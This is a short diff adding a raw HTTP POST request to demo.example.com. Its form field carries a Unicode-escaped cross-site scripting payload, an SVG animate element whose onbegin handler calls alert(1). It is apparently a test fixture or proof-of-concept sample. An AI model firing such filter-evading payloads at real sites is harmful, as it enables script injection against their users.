@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Connection: close
+
+cmd=\u003Csvg\u003E\u003Canimate onbegin=alert(1) attributeName=x\u003E
